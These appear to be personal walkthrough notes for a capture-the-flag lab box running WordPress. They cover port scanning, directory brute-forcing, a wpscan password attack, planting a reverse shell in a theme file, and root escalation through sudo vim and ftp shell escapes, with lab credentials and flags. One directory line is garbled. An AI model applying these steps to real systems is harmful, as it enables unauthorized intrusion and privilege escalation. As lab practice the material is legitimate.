tags: #privEsc #easy #gobuster #wpscan #sudoVIM #sudoFTP

IP address: 10.10.64.128
# Enumerations
```
nmap -sC -sV 10.10.250.171 -T5
```
![[Pasted image 20240609193857.png]]
```
nmap -p- -A 10.10.250.171 -T5
```
![[Pasted image 20240609202648.png]]
## Open ports
80: HTTP
4512: ssh
## Usernames/passwords
Hugo
C0ldd:9876543210
Philip


# Gobuster
```python
gobuster dir -u 10.10.250.171 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```
![[Pasted image 20240609194252.png]]
## Directories
/wp-content (Status: 301) [Size: 319] [--> http://10.10.250.171/wp-content/]

/wp-includes (Status: 30vulnerability0] [--> htXML-RPC0.10set up171/wp-includes/]

/wp-admin (Status: 301) [Size: 317] [--> http://10.10.250.171/wp-admin/]

/hidden (Status: 301) [Size: 315] [--> http://10.10.250.171/hidden/]

# Niko Finds
http://10.10.250.171/xmlrpc.php/
There might be a vulnerability with how XML-RPC is set up. Let's try it

> [!NOTE]
> The main weaknesses associated with XML-RPC are: Brute force attacks: Attackers try to login to WordPress using xmlrpc.php .
> lets see how that is actually done & how you might be able to leverage this while your trying to test a wordpress site for any potential vulnerabilites

Did not find anything with xmlrpc.php

# WP-Scans
```bash
 wpscan --url http://10.10.64.128/ -U c0ldd --password-attack wp-login -P /usr/share/wordlists/rockyou.txt
```
### Scan details
[!] XML-RPC seems to be enabled: http://10.10.64.128/xmlrpc.php  
[!] The version is out of date, the latest version is 3.7
### Found credentials 
**c0ldd:9876543210**
![[Pasted image 20240609204402.png]]

# Getting reverse shell after log-in
Appearance -> Editor 
We will be using header.php and uploading pentest monkey reverse shell.
```python
http://10.10.64.128/wp-content/themes/twentyfifteen/header.php
```
Visiting the site starts the reverse shell.
# Upgrading shell (MAKE A DOC FOR THIS)
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
```
export TERRM=xterm
```
```
stty raw -echo && fg    
```

# User.txt
```python
grep -Hrn c0ldd / 2>/dev/null
"""
-H: This option forces grep to always print the filename where the match was found, even if there's only one file being searched. It stands for "print filename".

-r: This option tells grep to search recursively through directories. It stands for "recursive".

-n: This option tells grep to prefix each line of output with the line number within its file. It stands for "line number".
"""
```
- /var/www/html/wp-config.php:22:define('DB_USER', 'c0ldd');

![[Pasted image 20240609210033.png]]

c0ldd:cybersecurity

```
cat user.txt
```
- RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==

# Root.txt
```
sudo -l
```
![[Pasted image 20240609210351.png]]
## VIM
https://gtfobins.github.io/gtfobins/vim/
```
sudo vim -c ':!/bin/sh'
```
- wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE
## FTP
https://gtfobins.github.io/gtfobins/ftp/
```
sudo ftp
```
```
!/bin/sh
```
- wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE
